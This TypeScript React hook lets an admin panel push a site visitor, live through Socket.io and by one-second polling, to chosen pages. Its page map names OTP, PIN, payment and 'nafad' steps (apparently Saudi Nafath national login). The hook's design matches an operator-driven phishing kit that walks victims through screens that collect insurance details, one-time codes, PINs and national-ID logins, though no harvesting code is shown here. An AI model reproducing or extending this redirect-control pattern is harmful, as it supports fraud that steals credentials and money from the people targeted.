;
import { useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { clearRedirectPage } from '@/lib/visitor-tracking';
import { onVisitorRedirect } from '@/lib/socket';
import { API_BASE } from '@/lib/api';

interface UseRedirectMonitorProps {
  visitorId: string;
  currentPage: string;
}

const pageMap: Record<string, string> = {
  // Admin panel page IDs
  'home-new': '/home-new',
  home: '/home-new',
  step1: '/step1',
  insur: '/step1',
  insur2: '/step1',
  step2: '/step2',
  otp: '/step2',
  veri: '/step2',
  '_t2': '/step2',
  step3: '/step3',
  pin: '/step3',
  confi: '/step3',
  '_t3': '/step3',
  step4: '/step4',
  check: '/step4',
  payment: '/step4',
  nafad: '/step4',
  '_t6': '/step4',
  step5: '/step5',
  phone: '/step5',
  'phone-info': '/step5',
  '_t5': '/step5',
  step6: '/step6',
  nafad2: '/step6',
  compar: '/compar',
  'thank-you': '/thank-you',
};

export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonitorProps) {
  const [, navigate] = useLocation();
  const redirectedRef = useRef(false);

  useEffect(() => {
    if (!visitorId) return;
    redirectedRef.current = false;
    console.log('[useRedirectMonitor] Started for visitor:', visitorId, 'currentPage:', currentPage);

    const doRedirect = async (targetPage: string) => {
      if (redirectedRef.current) return;
      const targetUrl = pageMap[targetPage];
      if (!targetUrl) {
        console.log('[useRedirectMonitor] No targetUrl for page:', targetPage);
        return;
      }
      // Don't redirect to same page
      const currentUrl = window.location.pathname;
      if (currentUrl === targetUrl) {
        console.log('[useRedirectMonitor] Already on target page:', targetUrl);
        // Clear redirectPage if already on target page
        try { await clearRedirectPage(visitorId); } catch { /* ignore */ }
        return;
      }
      redirectedRef.current = true;
      console.log('[useRedirectMonitor] Redirecting to', targetPage, '->', targetUrl);
      
      // Navigate to target page
      navigate(targetUrl);
      
      // After navigation, clear redirectPage to allow free navigation
      setTimeout(async () => {
        try { 
          await clearRedirectPage(visitorId); 
          console.log('[useRedirectMonitor] Redirect completed, cleared redirectPage');
        } catch { /* ignore */ }
      }, 2000); // Wait 2 seconds after navigation to ensure it completes
    };

    // 1. Socket.io real-time redirect (instant)
    const unsubscribeRedirect = onVisitorRedirect(({ targetPage }) => {
      doRedirect(targetPage);
    });

    // 2. Polling fallback every 1s - catches redirects when socket was offline
    const pollInterval = setInterval(async () => {
      if (redirectedRef.current) return;
      try {
        const url = `${API_BASE}/api/visitors/${visitorId}`;
        const res = await fetch(url, {
          headers: { 'Accept': 'application/json' }
        });
        if (!res.ok) {
          console.log('[useRedirectMonitor] Poll failed:', res.status);
          return;
        }
        const data = await res.json();
        // Check both redirectPage and adminRedirectPage
        const rp = data.redirectPage || data.redirect_page || data.adminRedirectPage;
        if (rp && rp !== currentPage) {
          console.log('[useRedirectMonitor] Redirect detected:', rp, '->', pageMap[rp] || 'unknown');
          doRedirect(rp);
        }
      } catch (err) {
        // Ignore polling errors silently
      }
    }, 1000);

    return () => {
      unsubscribeRedirect();
      clearInterval(pollInterval);
    };
  }, [visitorId, currentPage, navigate]);
}
